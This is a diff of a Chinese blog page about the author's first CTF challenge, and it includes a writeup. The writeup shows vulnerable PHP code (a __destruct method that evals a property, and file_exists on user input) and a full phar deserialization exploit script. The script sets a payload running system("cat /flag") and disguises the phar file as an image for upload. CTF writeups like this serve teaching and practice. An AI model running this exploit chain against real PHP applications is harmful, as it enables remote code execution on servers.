@@ -21,7 +21,7 @@
 <meta property="og:image" content="https://i.loli.net/2020/04/14/Z8sLyMWHgo5eSEG.png">
 <meta property="og:image" content="https://i.loli.net/2020/04/14/uYbapPS9WHZiOx5.png">
 <meta property="og:image" content="https://i.loli.net/2020/05/17/7gHvYaCOiyRrxFh.png">
-<meta property="og:updated_time" content="2020-05-24T16:00:20.554Z">
+<meta property="og:updated_time" content="2020-08-12T09:50:12.125Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="记第一次出题">
 <meta name="twitter:description" content="一道纯纯的签到题。其实大概是在一个月前就出好了，就等着咱月赛开始呢。这里主要是记录一下出题过程以及做题时遇到的问题">
@@ -204,7 +204,7 @@
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">809字</span>
+        <span class="post-count">820字</span>
       </span>
     </span>
 
@@ -236,7 +236,7 @@ docker search lamp
 docker pull tutum/lamp
 </pre>
 <h2 id="生成新容器"><a href="#生成新容器" class="headerlink" title="生成新容器"></a>生成新容器</h2><pre>
-docker run -d -p 2333:80 -p 3307:3306 tutum/lamp
+docker run -d -p 2333:80 tutum/lamp bash
 </pre>
 
 <h2 id="把代码拷贝到容器"><a href="#把代码拷贝到容器" class="headerlink" title="把代码拷贝到容器"></a>把代码拷贝到容器</h2><pre>
@@ -245,11 +245,11 @@ docker cp paibaike/ dc8498614301:/var/www/html/
 <h2 id="进入到容器"><a href="#进入到容器" class="headerlink" title="进入到容器"></a>进入到容器</h2><pre>
 docker exec -it dc8498614301 /bin/bash
 </pre>
-<h1 id="导出-导入容器"><a href="#导出-导入容器" class="headerlink" title="导出/导入容器"></a>导出/导入容器</h1><p><a href="https://blog.csdn.net/LEoe_/article/details/78685156" target="_blank" rel="noopener">https://blog.csdn.net/LEoe_/article/details/78685156</a>  </p>
+<h1 id="导出-导入容器"><a href="#导出-导入容器" class="headerlink" title="导出/导入容器"></a>导出/导入容器</h1><p><a href="https://blog.csdn.net/LEoe_/article/details/78685156" target="_blank" rel="noopener">https://blog.csdn.net/LEoe_/article/details/78685156</a><br>导入命令<br><code>docker import paibaike.tar paibaike</code>  </p>
 <h1 id="wp"><a href="#wp" class="headerlink" title="wp"></a>wp</h1><p>index页面只有两个地方可以链接（flag &amp; 用户）。<br><img src="https://i.loli.net/2020/04/14/hxWyIF5Mzu86LC7.png" alt="1.png"><br>flag处看到关键部分源码:  </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$flag=&quot;D0g3&#123;What_an_3xce11ent_CTRL_C&amp;V_3n9ineer_1_am&#125;&quot;;</span><br><span class="line">if(isset($_GET[&quot;file&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">$flag = $_GET[&quot;file&quot;];</span><br><span class="line">&#125;</span><br><span class="line">class xun</span><br><span class="line">&#123;	</span><br><span class="line"></span><br><span class="line">    var $output = &apos;echo &quot;ok&quot;;&apos;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this-&gt;output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_exists($flag);</span><br></pre></td></tr></table></figure>
 
-<p>这熟悉的file_exists，这可爱的eval，加上pai百科页面的疯狂明示，oh~ get it √。<br>payload:   </p>
+<p>这熟悉的file_exists，这可爱的eval，加上pai百科页面的疯狂明示，oh~ get it √。<br>payload(php5.4下运行):   </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class xun&#123;</span><br><span class="line">    var $output = &apos;echo &quot;ok&quot;;&apos;;</span><br><span class="line">    function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        eval($this -&gt; output);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$object = new xun();</span><br><span class="line">$object -&gt; output= &apos;system(&quot;cat /flag&quot;);&apos;;</span><br><span class="line"></span><br><span class="line">$phar = new Phar(&apos;phar.phar&apos;);</span><br><span class="line">$phar -&gt; startBuffering();//开始缓冲Phar写操作</span><br><span class="line">$phar -&gt; setStub(&apos;GIF89a&apos;.&apos;&lt;?php __HALT_COMPILER();?&gt;&apos;);</span><br><span class="line">$phar -&gt; addFromString(&apos;test.txt&apos;,&apos;test&apos;); //添加要压缩的文件</span><br><span class="line">$phar -&gt; setMetadata($object);//将自定义的meta-data存入manifest</span><br><span class="line">$phar -&gt; stopBuffering();//停止对Phar归档文件的缓冲写请求，并将更改保存到磁盘</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p>然后把phar文件后缀名改成png/jpg/gif<br>上传<br><img src="https://i.loli.net/2020/04/14/6TzcKv2XtgkMune.png" alt="2.png"><br>在index.php访问<br><img src="https://i.loli.net/2020/04/14/Z8sLyMWHgo5eSEG.png" alt="3.png"><br>okk！！<br><img src="https://i.loli.net/2020/04/14/uYbapPS9WHZiOx5.png" alt="flag.png">  </p>
@@ -367,6 +367,15 @@ docker exec -it dc8498614301 /bin/bash
 
   
 <nav id="article-nav">
+  
+    <a href="/2020/07/11/[BSidesCF 2020]Had a bad day/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          Had a bad day
+        
+      </div>
+    </a>
   
   
     <a href="/2020/05/16/一次晕乎乎的tp审计/" id="article-nav-older" class="article-nav-link-wrap">
@@ -545,7 +554,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">sqli</a>
+                <a href="javascript:void(0)" class="js-tag color4">php</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -557,11 +566,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">php</a>
+                <a href="javascript:void(0)" class="js-tag color4">md5</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">md5</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">序列化</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -573,11 +586,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">序列化</a>
+                <a href="javascript:void(0)" class="js-tag color5">sqli</a>
               </li>
              
               <li class="article-tag-list-item">
